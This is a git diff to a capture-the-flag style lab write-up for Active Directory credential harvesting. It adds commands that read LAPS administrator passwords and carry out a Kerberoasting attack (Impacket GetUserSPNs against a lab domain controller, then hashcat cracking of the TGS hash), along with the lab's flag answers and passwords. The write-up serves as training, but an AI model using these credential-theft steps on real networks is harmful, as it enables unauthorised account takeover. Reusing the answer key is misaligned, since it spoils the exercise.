@@ -779,9 +779,57 @@ It is important to note that in a real-world AD environment, the LAPS is enabled
 ### Answer the questions below
 
 * Which group has ExtendedRightHolder and is able to read the LAPS password?
-Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer?
+
+	`LAPsReader`
+
+	* Check if LAPS is installed in the target machine
+	
+		```
+		dir "C:\Program Files\LAPS\CSE"
+		```
+
+		![task8-admpwd](./images/task8-admpwd.png)
+
+	* Listing the available PowerShell cmdlets for LAPS
+	
+		```
+		Get-Command *AdmPwd*
+		```
+
+		![task8-list-admpwd](./images/task8-list-admpwd.png)
+
+	* Finding Users with `AdmPwdExtendedRights` attribute 
+	
+		```
+		Find-AdmPwdExtendedRights -Identity *
+		Find-AdmPwdExtendedRights -Identity THMorg
+		```
+
+		![task8-reader](./images/task8-reader.png)
+
+* Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer?
+
+	`THMLAPSPassw0rd`
+
+	* Finding Users belong to `LAPsReader` Group
+	
+		```
+		net groups "LAPsReader"
+		```
+
+		![task8-lapsreader](./images/task8-lapsreader.png)
+
+	* Getting LAPS Password with the Right User
+	
+		```
+		Get-AdmPwdPassword -ComputerName Creds-Harvestin
+		```
+
+		![task8-password](./images/task8-password.png)
 
 * Which user is able to read LAPS passwords?
+
+	`bk-admin`
 
 ## Task 9 - Other Attacks
 
@@ -853,7 +901,35 @@ The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authen
 
 * Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?
 
+	`svc-thm`
+
+	* Enumerating for SPN Accounts
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.131.49 THM.red/thm
+		```
+
+		![task9-spn](./images/task9-spn.png)
+
 * After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?
+
+	`Passw0rd1`
+
+	* Requesting a TGS ticket as SPN Account 
+	
+		```
+		python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.131.49 THM.red/thm -request-user svc-thm
+		```
+
+		![task9-tgs](./images/task9-tgs.png)
+
+	* Save TGS hash to file and cracking the TGS ticket using Hashcat
+	
+		```
+		hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+		```
+
+		![task9-hashcat](./images/task9-hashcat.png)
 
 ## Task 10 - Conclusion
 
